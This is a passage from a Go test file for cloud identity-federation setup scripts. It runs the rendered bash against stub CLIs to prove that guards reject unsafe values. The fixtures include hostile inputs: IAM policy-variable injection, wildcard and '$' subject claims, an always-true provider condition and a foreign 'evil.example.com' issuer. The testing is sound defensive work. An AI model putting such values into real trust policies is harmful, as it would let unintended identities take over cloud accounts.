package iacfiles

import (
	"bytes"
	"cmp"
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"text/template"
	"time"
)

// testTemplateData mirrors the fields that CLI templates read. It's a local
// fixture rather than a dependency on internal/api's federationIaCData so the
// test stays in this package (which has no other test coverage).
type testTemplateData struct {
	AccountName         string
	AccountExternalID   string
	AccountSlug         string
	Source              string
	OIDCIssuerURL       string
	OIDCIssuerHost      string
	OIDCAudience        string
	OIDCSubjectClaim    string
	SubscriptionID      string
	TenantID            string
	ProjectID           string
	ServiceAccountEmail string
	OIDCIssuerURI       string
	CUDlyAPIURL         string
	SourceAccountID     string
	ContactEmail        string
}

func renderCLITemplate(t *testing.T, path string, data testTemplateData) string {
	t.Helper()
	raw, err := Templates.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	tmpl, err := template.New(path).Parse(string(raw))
	if err != nil {
		t.Fatalf("parse %s: %v", path, err)
	}
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, data); err != nil {
		t.Fatalf("execute %s: %v", path, err)
	}
	return buf.String()
}

// baseData matches what buildGenericIaCData produces for a self-service download
// (account-specific fields empty, CUDlyAPIURL set so the auto-register block renders).
func baseData() testTemplateData {
	return testTemplateData{
		AccountSlug:     "target",
		Source:          "aws",
		CUDlyAPIURL:     "https://cudly.example.com",
		SourceAccountID: "123456789012",
		ContactEmail:    "ops@example.com",
	}
}

func TestCLITemplatesAutoRegister(t *testing.T) {
	cases := []struct {
		name        string
		path        string
		mustContain []string
		mustNot     []string
	}{
		{
			name: "aws-cross-account",
			path: "templates/aws-cross-account-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"aws_auth_mode": "role_arn"`,
				`"aws_external_id": "${EXTERNAL_ID}"`,
				`"aws_role_arn": "${ROLE_ARN}"`,
				`"external_id": "${TARGET_ACCOUNT_ID}"`,
				`TARGET_ACCOUNT_ID=$(aws sts get-caller-identity`,
				`ACCOUNT_NAME="${CUDLY_ACCOUNT_NAME:-AWS ${TARGET_ACCOUNT_ID}}"`,
				`read -r -d '' PAYLOAD <<JSON || true`,
				`case "$HTTP_CODE" in`,
			},
			mustNot: []string{
				"/api/registrations",
				`"account_id":`,
				`"auth_mode":`,
			},
		},
		{
			name: "aws-wif",
			path: "templates/aws-wif-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"aws_auth_mode": "workload_identity_federation"`,
				`"aws_role_arn": "${ROLE_ARN}"`,
				`"external_id": "${TARGET_ACCOUNT_ID}"`,
				`TARGET_ACCOUNT_ID=$(aws sts get-caller-identity`,
				// #1640: the trust policy's :sub condition must be present
				// unconditionally — there is no longer a code path that omits it.
				`"${OIDC_HOST}:sub": "${OIDC_SUBJECT_CLAIM}"`,
			},
			mustNot: []string{
				"/api/registrations",
				`"account_id":`,
				// WIF flow has no STS external_id
				`aws_external_id`,
				// #1640: the subject claim is no longer optional.
				"Optional: restrict which OIDC subject",
			},
		},
		{
			name: "azure-wif",
			path: "templates/azure-wif-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"azure_auth_mode": "workload_identity_federation"`,
				`"azure_subscription_id": "${SUBSCRIPTION_ID}"`,
				`"azure_tenant_id": "${TENANT_ID}"`,
				`"azure_client_id": "${APP_ID}"`,
				`"external_id": "${SUBSCRIPTION_ID}"`,
				`ACCOUNT_NAME="${CUDLY_ACCOUNT_NAME:-Azure ${SUBSCRIPTION_ID}}"`,
				// Secret-free redesign: must use federated identity credential, not a cert upload.
				"az ad app federated-credential create",
				`"issuer": "${CUDLY_ISSUER_URL}"`,
				`"subject": "${CUDLY_FEDERATED_SUBJECT}"`,
				`"audiences": ["${CUDLY_FEDERATED_AUDIENCE}"]`,
				// Issuer env var must default to the CUDly base URL + /oidc
				// so Azure AD appending /.well-known/openid-configuration
				// resolves to the discovery endpoint on the CUDly deployment.
				`CUDLY_ISSUER_URL="${CUDLY_ISSUER_URL:-https://cudly.example.com/oidc}"`,
			},
			mustNot: []string{
				"/api/registrations",
				`"auth_mode":`,
				`"tenant_id":`,
				`"client_id":`,
				// Never the cert-based path.
				"az ad app credential reset",
				"CERTIFICATE_PEM_PATH",
				"azure_wif_private_key",
			},
		},
		{
			name: "gcp-wif",
			path: "templates/gcp-wif-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"gcp_auth_mode": "workload_identity_federation"`,
				`"gcp_project_id": "${PROJECT_ID}"`,
				`"gcp_client_email": "${SERVICE_ACCOUNT_EMAIL}"`,
				`"gcp_wif_audience": "${WIF_AUDIENCE}"`,
				`"external_id": "${PROJECT_ID}"`,
				`ACCOUNT_NAME="${CUDLY_ACCOUNT_NAME:-GCP ${PROJECT_ID}}"`,
				// Secret-free redesign: issuer is CUDly's own OIDC
				// deployment, subject is the fixed cudly-controller.
				`CUDLY_ISSUER_URL="${CUDLY_ISSUER_URL:-https://cudly.example.com/oidc}"`,
				`--issuer-uri="${CUDLY_ISSUER_URL}"`,
				// #1661: the provider is created from these two variables and an
				// existing provider is compared against the same ones, so the
				// create path and the reuse check cannot drift apart.
				`EXPECTED_MAPPING="google.subject=assertion.sub"`,
				`EXPECTED_CONDITION="assertion.sub == '${CUDLY_FEDERATED_SUBJECT}'"`,
				`--attribute-mapping="${EXPECTED_MAPPING}"`,
				`--attribute-condition="${EXPECTED_CONDITION}"`,
				`principal://iam.googleapis.com/${POOL_NAME}/subject/${CUDLY_FEDERATED_SUBJECT}`,
				`WIF_AUDIENCE="//iam.googleapis.com/${POOL_NAME}/providers/${PROVIDER_ID}"`,
			},
			mustNot: []string{
				// #1661: a swallowed create is what let the script grant the
				// impersonation binding against a provider it never inspected.
				"(pool may already exist)",
				"(provider may already exist)",
				// An abort message must not overstate what it left behind:
				// `gcloud config set project` and `services enable` have both
				// already run by then. Reassuring output that does not match
				// what happened is the defect this issue is about.
				"Nothing has been created or changed",
				"/api/registrations",
				`"service_account_email":`,
				// The old AWS-STS-ARN provider is gone.
				"create-aws",
				"attribute.aws_role",
				"SOURCE_AWS_ACCOUNT_ID",
				// No longer asking the operator to generate a creds
				// config JSON file.
				"create-cred-config",
				"gcp_workload_identity_config",
			},
		},
		{
			name: "gcp-sa-impersonation",
			path: "templates/gcp-sa-impersonation-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"gcp_auth_mode": "application_default"`,
				`"gcp_project_id": "${PROJECT_ID}"`,
				`"gcp_client_email": "${SERVICE_ACCOUNT_EMAIL}"`,
				`ACCOUNT_NAME="${CUDLY_ACCOUNT_NAME:-GCP ${PROJECT_ID}}"`,
			},
			mustNot: []string{
				"/api/registrations",
				`"service_account_email":`,
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rendered := renderCLITemplate(t, tc.path, baseData())
			for _, needle := range tc.mustContain {
				if !strings.Contains(rendered, needle) {
					t.Errorf("%s: rendered script missing %q", tc.path, needle)
				}
			}
			for _, needle := range tc.mustNot {
				if strings.Contains(rendered, needle) {
					t.Errorf("%s: rendered script still contains stale %q", tc.path, needle)
				}
			}
		})
	}
}

// TestAWSWIFCLI_SubjectClaimRequired is the regression test for #1640: the
// CLI bundle's trust policy used to have an else-branch that silently built a
// subject-less policy (accepting every identity the issuer can mint) when
// OIDC_SUBJECT_CLAIM was unset. That branch is gone; this asserts there is no
// path left in the rendered script that omits the :sub condition, and that
// the required-value and forbidden-character guards are both present.
func TestAWSWIFCLI_SubjectClaimRequired(t *testing.T) {
	rendered := renderCLITemplate(t, "templates/aws-wif-cli.sh.tmpl", baseData()) // OIDCSubjectClaim == ""

	// Exactly one Condition block, and it always carries :sub — no branch
	// builds a StringEquals map with only :aud.
	subCondition := `"${OIDC_HOST}:sub": "${OIDC_SUBJECT_CLAIM}"`
	if n := strings.Count(rendered, subCondition); n != 1 {
		t.Errorf("expected exactly one :sub condition in the rendered trust policy, found %d", n)
	}
	subjectLessCondition := `{"StringEquals": {"${OIDC_HOST}:aud": "${OIDC_AUDIENCE}"}}`
	if strings.Contains(rendered, subjectLessCondition) {
		t.Errorf("rendered script still contains a subject-less Condition block: %q", subjectLessCondition)
	}

	// An unset/empty OIDC_SUBJECT_CLAIM must be rejected before any AWS call.
	if !strings.Contains(rendered, `if [[ -z "${OIDC_SUBJECT_CLAIM}" ]]`) {
		t.Error("rendered script must reject an empty OIDC_SUBJECT_CLAIM")
	}
	if !strings.Contains(rendered, "OIDC_SUBJECT_CLAIM is required") {
		t.Error("rendered script must explain that OIDC_SUBJECT_CLAIM is required")
	}
	// The empty-value guard must run before the first `aws` invocation, so a
	// misconfigured run fails loud instead of creating a partial OIDC provider.
	if guard, firstAWSCall := strings.Index(rendered, `if [[ -z "${OIDC_SUBJECT_CLAIM}" ]]`), strings.Index(rendered, "aws iam"); guard < 0 || firstAWSCall < 0 || guard > firstAWSCall {
		t.Errorf("the empty-OIDC_SUBJECT_CLAIM guard (offset %d) must run before the first aws iam call (offset %d)", guard, firstAWSCall)
	}

	// $ and * must be rejected — same characters PR #1602 rejects in the
	// CloudFormation OIDCSubjectClaim parameter, for the same reason.
	if !strings.Contains(rendered, `must not contain whitespace, '\$' or '*'`) {
		t.Error("rendered script must reject whitespace, '$', and '*' in OIDC_SUBJECT_CLAIM")
	}
}

// awsStubScript returns a stand-in `aws` executable that appends every
// invocation to logPath and prints a value the caller's `$(...)` captures can
// consume. It never contacts AWS, so a test that reaches it has proved the
// guard let the run through.
func awsStubScript(logPath string) string {
	return "#!/usr/bin/env bash\n" +
		// One log line per invocation: the trust-policy argument is multi-line
		// JSON, so newlines inside the arguments are folded to spaces first.
		"args=\"$*\"\n" +
		"printf '%s\\n' \"${args//$'\\n'/ }\" >> '" + logPath + "'\n" +
		// "None" is what the script's provider-lookup branches expect when no
		// OIDC provider exists yet, so the rest of the script proceeds.
		"echo None\n"
}

// runRenderedWIFScript writes the rendered aws-wif-cli.sh to a temp file, puts a
// recording `aws` stub first on PATH, runs the script under bash, and returns
// its exit code, stderr and the list of `aws` invocations the stub saw.
func runRenderedWIFScript(t *testing.T, rendered string, env map[string]string) (exitCode int, stderr string, awsCalls []string) {
	t.Helper()
	// stdout is dropped: this script's progress chatter is not under test.
	exitCode, _, stderr, awsCalls = runRenderedScript(t, "aws-wif-cli.sh", rendered,
		func(logPath string) map[string]string {
			return map[string]string{"aws": awsStubScript(logPath)}
		}, env)
	return exitCode, stderr, awsCalls
}

// runRenderedScript writes a rendered script to a temp file, puts the given stub
// executables (name -> script body, built around the invocation log path this
// function owns) first on PATH, runs the script under bash, and returns its exit
// code, stderr and the invocations the stubs recorded.
//
// PATH is set on the child process only (exec.Cmd.Env). The parent test
// process's environment is never mutated, so a run here cannot race with, or
// leak a stub CLI into, any other test in this package.
func runRenderedScript(
	t *testing.T,
	scriptName string,
	rendered string,
	stubs func(logPath string) map[string]string,
	env map[string]string,
) (exitCode int, stdout, stderr string, calls []string) {
	t.Helper()

	// Fatal, not Skip: this is a security regression test, and a green run that
	// silently never executed the guard is worse than a red one. bash is already
	// a hard dependency of this repo (every generated bundle is a bash script,
	// and pre-commit runs shellcheck over them).
	bashPath, lookErr := exec.LookPath("bash")
	if lookErr != nil {
		t.Fatalf("bash is required to execute the rendered script: %v", lookErr)
	}

	dir := t.TempDir()
	scriptPath := filepath.Join(dir, scriptName)
	if err := os.WriteFile(scriptPath, []byte(rendered), 0o600); err != nil {
		t.Fatalf("write rendered script: %v", err)
	}

	stubDir := filepath.Join(dir, "bin")
	if err := os.Mkdir(stubDir, 0o700); err != nil {
		t.Fatalf("create stub dir: %v", err)
	}
	logPath := filepath.Join(dir, "invocations.log")
	for name, body := range stubs(logPath) {
		if err := os.WriteFile(filepath.Join(stubDir, name), []byte(body), 0o755); err != nil {
			t.Fatalf("write %s stub: %v", name, err)
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, bashPath, scriptPath)
	// The real PATH is kept after stubDir so the script's `sed`/`echo` still
	// resolve; stubDir comes first so the stubbed CLI resolves to the stub.
	cmd.Env = []string{"PATH=" + stubDir + string(os.PathListSeparator) + os.Getenv("PATH")}
	for k, v := range env {
		cmd.Env = append(cmd.Env, k+"="+v)
	}
	var errBuf, outBuf strings.Builder
	cmd.Stderr = &errBuf
	cmd.Stdout = &outBuf

	var exitErr *exec.ExitError
	if err := cmd.Run(); err != nil && !errors.As(err, &exitErr) {
		t.Fatalf("run rendered script: %v (stderr: %s)", err, errBuf.String())
	}

	logBytes, err := os.ReadFile(logPath)
	switch {
	case os.IsNotExist(err):
		// The stub was never invoked, which is what the reject cases want.
	case err != nil:
		t.Fatalf("read invocation log: %v", err)
	default:
		for _, line := range strings.Split(strings.TrimSpace(string(logBytes)), "\n") {
			if line != "" {
				calls = append(calls, line)
			}
		}
	}
	return cmd.ProcessState.ExitCode(), outBuf.String(), errBuf.String(), calls
}

// TestAWSWIFCLI_SubjectClaimGuardBlocksAWSCalls executes the rendered script
// instead of only reading it. TestAWSWIFCLI_SubjectClaimRequired asserts on
// rendered text, which cannot distinguish a guard that works from a guard whose
// condition is inverted or whose `exit 1` was dropped; this runs Bash against a
// recording `aws` stub and asserts that an invalid OIDC_SUBJECT_CLAIM produces
// both a non-zero exit and zero AWS calls, so a broken guard cannot leave a
// half-created OIDC provider or a subject-less role behind.
func TestAWSWIFCLI_SubjectClaimGuardBlocksAWSCalls(t *testing.T) {
	// CUDlyAPIURL is cleared so the auto-registration block (which shells out to
	// curl and jq) is not rendered: this test is about the subject-claim guard,
	// and the positive control below runs the script to completion.
	data := baseData()
	data.CUDlyAPIURL = ""
	// A real issuer so OIDC_HOST resolves and the positive control can assert on
	// the fully-formed "<host>:sub" condition key the trust policy carries.
	data.OIDCIssuerURL = "https://accounts.google.com"
	rendered := renderCLITemplate(t, "templates/aws-wif-cli.sh.tmpl", data)

	// The two messages the rendered script's guards emit. Whitespace, $ and *
	// share one `case` arm, so they share one message.
	const (
		wantRequired  = "OIDC_SUBJECT_CLAIM is required"
		wantForbidden = `OIDC_SUBJECT_CLAIM must not contain whitespace, '$' or '*'.`
	)

	reject := []struct {
		name string
		// env holds the variables set on the child process. Omitting the
		// OIDC_SUBJECT_CLAIM key leaves the variable unset for that run.
		env      map[string]string
		wantText string
	}{
		{"unset", map[string]string{}, wantRequired},
		{"empty", map[string]string{"OIDC_SUBJECT_CLAIM": ""}, wantRequired},
		{"only whitespace", map[string]string{"OIDC_SUBJECT_CLAIM": "   "}, wantForbidden},
		{"embedded space", map[string]string{"OIDC_SUBJECT_CLAIM": "abc def"}, wantForbidden},
		{"tab", map[string]string{"OIDC_SUBJECT_CLAIM": "abc\tdef"}, wantForbidden},
		{"iam policy variable", map[string]string{"OIDC_SUBJECT_CLAIM": "${accounts.google.com:sub}"}, wantForbidden},
		{"bare dollar", map[string]string{"OIDC_SUBJECT_CLAIM": "abc$def"}, wantForbidden},
		{"bare wildcard", map[string]string{"OIDC_SUBJECT_CLAIM": "*"}, wantForbidden},
		{"embedded wildcard", map[string]string{"OIDC_SUBJECT_CLAIM": "abc*"}, wantForbidden},
	}

	for _, tc := range reject {
		t.Run("reject/"+tc.name, func(t *testing.T) {
			exitCode, stderr, awsCalls := runRenderedWIFScript(t, rendered, tc.env)

			if exitCode == 0 {
				t.Errorf("OIDC_SUBJECT_CLAIM %q was accepted (exit 0)", tc.env["OIDC_SUBJECT_CLAIM"])
			}
			if len(awsCalls) != 0 {
				t.Errorf("the guard must run before any AWS call, but the aws stub was invoked %d time(s): %v",
					len(awsCalls), awsCalls)
			}
			if !strings.Contains(stderr, tc.wantText) {
				t.Errorf("stderr must explain the rejection with %q, got:\n%s", tc.wantText, stderr)
			}
		})
	}

	// A hostile value baked into the template's default (the "{{.OIDCSubjectClaim}}"
	// fallback) is caught by the same guard when it merely contains a forbidden
	// character, so an operator who edits the generated script by hand is
	// covered too. This is not a substitute for validating the value at
	// generation time: the guard runs after the assignment on the
	// OIDC_SUBJECT_CLAIM="${OIDC_SUBJECT_CLAIM:-<default>}" line, so a command
	// substitution in the default would already have run. That is why
	// scripts/generate-federation-iac.go validates the flag before rendering.
	t.Run("reject/hostile template default", func(t *testing.T) {
		hostile := baseData()
		hostile.CUDlyAPIURL = ""
		hostile.OIDCSubjectClaim = "abc def"
		exitCode, stderr, awsCalls := runRenderedWIFScript(t,
			renderCLITemplate(t, "templates/aws-wif-cli.sh.tmpl", hostile), map[string]string{})

		if exitCode == 0 {
			t.Error("a whitespace-bearing template default was accepted (exit 0)")
		}
		if len(awsCalls) != 0 {
			t.Errorf("the aws stub must not be invoked, got %d call(s): %v", len(awsCalls), awsCalls)
		}
		if !strings.Contains(stderr, wantForbidden) {
			t.Errorf("stderr must explain the rejection with %q, got:\n%s", wantForbidden, stderr)
		}
	})

	// Positive control: without it, a guard that rejected every value would
	// satisfy every assertion above.
	t.Run("accept/valid subject claim", func(t *testing.T) {
		exitCode, stderr, awsCalls := runRenderedWIFScript(t, rendered,
			map[string]string{"OIDC_SUBJECT_CLAIM": "123456789012345678901"})

		if exitCode != 0 {
			t.Fatalf("a valid OIDC_SUBJECT_CLAIM was rejected (exit %d); stderr:\n%s", exitCode, stderr)
		}
		if len(awsCalls) == 0 {
			t.Fatal("a valid OIDC_SUBJECT_CLAIM must get past the guard and reach the aws calls, but the stub was never invoked")
		}
		// The role must actually be created with a trust policy carrying the
		// :sub condition, resolved to the supplied value.
		var createRole string
		for _, call := range awsCalls {
			if strings.HasPrefix(call, "iam create-role") {
				createRole = call
			}
		}
		if createRole == "" {
			t.Fatalf("expected an `aws iam create-role` invocation, got: %v", awsCalls)
		}
		if !strings.Contains(createRole, `"accounts.google.com:sub": "123456789012345678901"`) {
			t.Errorf("the trust policy passed to create-role must pin :sub to the supplied claim, got:\n%s", createRole)
		}
	})
}

// gcloudStubScript returns a stand-in `gcloud` that records every invocation and
// answers describes from state files under $CUDLY_STUB_STATE. The state
// directory is the caller's, so a test can seed a pre-existing pool/provider
// before the run and can hand the same directory to two consecutive runs to
// exercise the re-run path a customer actually takes.
//
// Only the describe/create verbs the GCP WIF script branches on are modeled;
// everything else (config set, services enable, add-iam-policy-binding)
// succeeds, so a run that reaches them has proved the guards let it through.
func gcloudStubScript(logPath string) string {
	return `#!/usr/bin/env bash
state="${CUDLY_STUB_STATE:?stub state dir}"
printf '%s\n' "gcloud $*" >> '` + logPath + `'

# Flag values are read off the argument vector rather than parsed out of the
# joined string, so a value containing spaces or quotes is recorded verbatim.
issuer=""; condition=""; mapping=""; provider_id=""; prev=""
for a in "$@"; do
  case "$a" in
    --issuer-uri=*)          issuer="${a#--issuer-uri=}" ;;
    --attribute-condition=*) condition="${a#--attribute-condition=}" ;;
    --attribute-mapping=*)   mapping="${a#--attribute-mapping=}" ;;
  esac
  [[ "$prev" == "create-oidc" ]] && provider_id="$a"
  prev="$a"
done

pool_path="projects/000000000000/locations/global/workloadIdentityPools/cudly-target"

case "$*" in
  *"workload-identity-pools providers describe"*)
    [[ -f "${state}/provider" ]] || exit 1
    case "$*" in
      *"value(oidc.issuerUri)"*)     cat "${state}/provider.issuer" ;;
      *"value(attributeCondition)"*) cat "${state}/provider.condition" ;;
      *"value(attributeMapping)"*)   cat "${state}/provider.mapping" ;;
      *"value(state)"*)              cat "${state}/provider.state" ;;
      *"value(disabled)"*)           cat "${state}/provider.disabled" ;;
    esac
    ;;
  *"workload-identity-pools providers list"*)
    if [[ -n "${STUB_PROVIDER_LIST_ERROR:-}" ]]; then
      echo "ERROR: (gcloud.iam.workload-identity-pools.providers.list) ${STUB_PROVIDER_LIST_ERROR}" >&2
      exit 1
    fi
    # Soft-deleted providers are omitted here as they are by real gcloud
    # without --show-deleted; the seeded list holds only live ones.
    [[ -f "${state}/providers.list" ]] && cat "${state}/providers.list"
    ;;
  *"workload-identity-pools providers create-oidc"*)
    if [[ -n "${STUB_PROVIDER_CREATE_ERROR:-}" ]]; then
      echo "ERROR: (gcloud.iam.workload-identity-pools.providers.create-oidc) ${STUB_PROVIDER_CREATE_ERROR}" >&2
      exit 1
    fi
    printf '%s\n' "$issuer"    > "${state}/provider.issuer"
    printf '%s\n' "$condition" > "${state}/provider.condition"
    printf '%s\n' "$mapping"   > "${state}/provider.mapping"
    printf 'ACTIVE\n'          > "${state}/provider.state"
    printf 'False\n'           > "${state}/provider.disabled"
    printf '%s\n' "${pool_path}/providers/${provider_id}" >> "${state}/providers.list"
    touch "${state}/provider"
    ;;
  *"workload-identity-pools describe"*)
    [[ -f "${state}/pool" ]] || exit 1
    echo "projects/000000000000/locations/global/workloadIdentityPools/cudly-target"
    ;;
  *"workload-identity-pools create"*)
    if [[ -n "${STUB_POOL_CREATE_ERROR:-}" ]]; then
      echo "ERROR: (gcloud.iam.workload-identity-pools.create) ${STUB_POOL_CREATE_ERROR}" >&2
      exit 1
    fi
    touch "${state}/pool"
    ;;
esac
exit 0
`
}

const (
	// gcpStubIssuer is the issuer the rendered script is run with, i.e. the
	// value an existing provider must carry to be reusable.
	gcpStubIssuer = "https://cudly.example.com/oidc"
	// gcpExpectedCondition/gcpExpectedMapping are what the script writes for the
	// default subject, and therefore what it must demand of a provider it reuses.
	gcpExpectedCondition = "assertion.sub == 'cudly-controller'"
	gcpExpectedMapping   = "google.subject=assertion.sub"
)

// gcpStubState is the pre-existing GCP state a run starts from. The zero value
// is an empty project.
type gcpStubState struct {
	pool     bool
	provider bool
	// Set only when provider is true.
	issuer    string
	condition string
	mapping   string
	// state defaults to ACTIVE and disabled to False when provider is true.
	state    string
	disabled string
	// otherProviders are further live providers in the same pool, given as
	// bare IDs.
	otherProviders []string
}

// seedGCPStubState materializes state in dir for the stub to read.
func seedGCPStubState(t *testing.T, dir string, s gcpStubState) {
	t.Helper()
	write := func(name, content string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content+"\n"), 0o600); err != nil {
			t.Fatalf("seed %s: %v", name, err)
		}
	}
	if s.pool {
		write("pool", "")
	}
	const poolPath = "projects/000000000000/locations/global/workloadIdentityPools/cudly-target"
	var live []string
	if s.provider {
		write("provider", "")
		write("provider.issuer", s.issuer)
		write("provider.condition", s.condition)
		write("provider.mapping", s.mapping)
		write("provider.state", cmp.Or(s.state, "ACTIVE"))
		write("provider.disabled", cmp.Or(s.disabled, "False"))
		live = append(live, poolPath+"/providers/cudly-oidc")
	}
	for _, id := range s.otherProviders {
		live = append(live, poolPath+"/providers/"+id)
	}
	if len(live) > 0 {
		write("providers.list", strings.Join(live, "\n"))
	}
}

// runGCPWIFScript renders gcp-wif-cli.sh and runs it against the gcloud stub,
// with stateDir carrying the project state across runs.
func runGCPWIFScript(t *testing.T, stateDir string, env map[string]string) (exitCode int, stdout, stderr string, calls []string) {
	t.Helper()
	// CUDlyAPIURL is cleared so the auto-registration block (curl + jq) is not
	// rendered: these tests are about the pool/provider/grant sequence.
	data := baseData()
	data.CUDlyAPIURL = ""
	data.ProjectID = "cudly-demo-project"
	data.ServiceAccountEmail = "cudly@cudly-demo-project.iam.gserviceaccount.com"
	rendered := renderCLITemplate(t, "templates/gcp-wif-cli.sh.tmpl", data)

	full := map[string]string{
		"CUDLY_STUB_STATE": stateDir,
		// Rendered from an empty CUDlyAPIURL above, so it must be supplied here
		// for the issuer guard to pass.
		"CUDLY_ISSUER_URL": gcpStubIssuer,
	}
	for k, v := range env {
		full[k] = v
	}
	return runRenderedScript(t, "gcp-wif-cli.sh", rendered, func(logPath string) map[string]string {
		return map[string]string{"gcloud": gcloudStubScript(logPath)}
	}, full)
}

// callsContaining returns the recorded gcloud invocations containing needle.
func callsContaining(calls []string, needle string) []string {
	var out []string
	for _, c := range calls {
		if strings.Contains(c, needle) {
			out = append(out, c)
		}
	}
	return out
}

// TestGCPWIFCLI_ProviderReuseIsVerified is the regression test for #1661. The
// served script used to run both creates with `|| echo "(may already exist)"`,
// so under `set -euo pipefail` every failure of a security-critical create was
// swallowed: a provider that already existed with a weaker attribute condition
// (or none) was silently reused, the impersonation grant was made against it,
// and the script printed "=== Done ===" and exited 0.
//
// Each reject case below asserts the run aborts *before* the grant, and the
// accept cases assert a fresh project and a legitimate re-run both still
// succeed, so the fix cannot be a blanket refusal.
func TestGCPWIFCLI_ProviderReuseIsVerified(t *testing.T) {
	const grantCall = "add-iam-policy-binding"

	reject := []struct {
		name  string
		state gcpStubState
		env   map[string]string
		// wantText must appear in stderr.
		wantText string
		// absentCall, when set, must not appear among the recorded gcloud
		// invocations. It carries the cases where aborting at the right point
		// matters as much as aborting at all.
		absentCall string
	}{
		{
			// The actual vulnerability: "true" is non-empty and admits every
			// subject the issuer will sign.
			name:     "existing provider with an always-true condition",
			state:    gcpStubState{pool: true, provider: true, issuer: gcpStubIssuer, condition: "true", mapping: gcpExpectedMapping},
			wantText: "different attribute condition",
		},
		{
			name:     "existing provider with no condition at all",
			state:    gcpStubState{pool: true, provider: true, issuer: gcpStubIssuer, condition: "", mapping: gcpExpectedMapping},
			wantText: "different attribute condition",
		},
		{
			name:     "existing provider pinned to a different subject",
			state:    gcpStubState{pool: true, provider: true, issuer: gcpStubIssuer, condition: "assertion.sub == 'someone-else'", mapping: gcpExpectedMapping},
			wantText: "different attribute condition",
		},
		{
			// A matching condition on a provider trusting someone else's issuer
			// admits whoever that issuer signs a cudly-controller token for.
			name:     "existing provider bound to a foreign issuer",
			state:    gcpStubState{pool: true, provider: true, issuer: "https://evil.example.com/oidc", condition: gcpExpectedCondition, mapping: gcpExpectedMapping},
			wantText: "different issuer URI",
		},
		{
			name:     "existing provider with a different attribute mapping",
			state:    gcpStubState{pool: true, provider: true, issuer: gcpStubIssuer, condition: gcpExpectedCondition, mapping: "google.subject=assertion.email"},
			wantText: "different attribute mapping",
		},
		{
			// Not an "already exists" case: any other create failure (quota,
			// permission, a concurrent run winning the race) must stop the run
			// rather than fall through to the grant.
			name:     "provider create fails",
			state:    gcpStubState{pool: true},
			env:      map[string]string{"STUB_PROVIDER_CREATE_ERROR": "PERMISSION_DENIED: caller lacks iam.workloadIdentityPoolProviders.create"},
			wantText: "PERMISSION_DENIED",
		},
		{
			// The pre-fix script swallowed this one too and went on to create
			// the provider; the assertion that no provider create is attempted
			// is what makes this case a regression witness rather than a
			// restatement of the propagation loop's eventual abort.
			name:       "pool create fails",
			env:        map[string]string{"STUB_POOL_CREATE_ERROR": "PERMISSION_DENIED: caller lacks iam.workloadIdentityPools.create"},
			wantText:   "PERMISSION_DENIED",
			absentCall: "providers create-oidc",
		},
		{
			// describe returns a soft-deleted provider with its configuration
			// intact, so every comparison matches and the run would otherwise
			// report success against a provider that cannot exchange tokens.
			name: "existing provider is soft-deleted",
			state: gcpStubState{
				pool: true, provider: true, issuer: gcpStubIssuer,
				condition: gcpExpectedCondition, mapping: gcpExpectedMapping, state: "DELETED",
			},
			wantText: "cannot exchange tokens",
		},
		{
			name: "existing provider is disabled",
			state: gcpStubState{
				pool: true, provider: true, issuer: gcpStubIssuer,
				condition: gcpExpectedCondition, mapping: gcpExpectedMapping, disabled: "True",
			},
			wantText: "cannot exchange tokens",
		},
		{
			// The guard must not depend on gcloud rendering the boolean as
			// Python's "True": a lowercase or numeric rendering still means
			// disabled, and testing for the one usable value keeps it that way.
			name: "existing provider is disabled, rendered lowercase",
			state: gcpStubState{
				pool: true, provider: true, issuer: gcpStubIssuer,
				condition: gcpExpectedCondition, mapping: gcpExpectedMapping, disabled: "true",
			},
			wantText: "cannot exchange tokens",
		},
		{
			// The grant names the pool, not the provider, so a second provider
			// in the same pool that maps a token to the same subject satisfies
			// it. Verifying only this run's provider would leave that open.
			name: "pool holds a provider this script did not configure",
			state: gcpStubState{
				pool: true, provider: true, issuer: gcpStubIssuer,
				condition: gcpExpectedCondition, mapping: gcpExpectedMapping,
				otherProviders: []string{"someone-elses-oidc"},
			},
			wantText: "did not configure",
		},
		{
			// The fail-closed case for the enumeration itself: a list this run
			// could not read says nothing about what the pool holds, so it must
			// stop rather than proceed on an empty result. This is what the
			// fetch-into-a-variable form buys over piping into a filter.
			name:       "listing the pool's providers fails",
			state:      gcpStubState{pool: true},
			env:        map[string]string{"STUB_PROVIDER_LIST_ERROR": "PERMISSION_DENIED: caller lacks iam.workloadIdentityPoolProviders.list"},
			wantText:   "PERMISSION_DENIED",
			absentCall: "providers create-oidc",
		},
		{
			// The shape a customer onboarded before the provider default
			// changed from cudly-<source> to cudly-oidc lands in: the pool
			// holds only the old provider. The refusal has to come before the
			// create, or every attempt leaves another provider behind.
			name: "pool holds only a legacy provider, ours not yet created",
			state: gcpStubState{
				pool:           true,
				otherProviders: []string{"cudly-aws"},
			},
			wantText:   "did not configure",
			absentCall: "providers create-oidc",
		},
	}

	for _, tc := range reject {
		t.Run("reject/"+tc.name, func(t *testing.T) {
			stateDir := t.TempDir()
			seedGCPStubState(t, stateDir, tc.state)

			exitCode, stdout, stderr, calls := runGCPWIFScript(t, stateDir, tc.env)

			if exitCode == 0 {
				t.Errorf("the run must abort, but it exited 0; stdout:\n%s", stdout)
			}
			if grants := callsContaining(calls, grantCall); len(grants) != 0 {
				t.Errorf("the impersonation grant must not be made, but %s was invoked: %v", grantCall, grants)
			}
			if strings.Contains(stdout, "=== Done ===") {
				t.Errorf("an aborted run must not report success; stdout:\n%s", stdout)
			}
			if !strings.Contains(stderr, tc.wantText) {
				t.Errorf("stderr must explain the abort with %q, got:\n%s", tc.wantText, stderr)
			}
			if tc.absentCall != "" {
				if got := callsContaining(calls, tc.absentCall); len(got) != 0 {
					t.Errorf("the run must abort before %q, but it was invoked: %v", tc.absentCall, got)
				}
			}
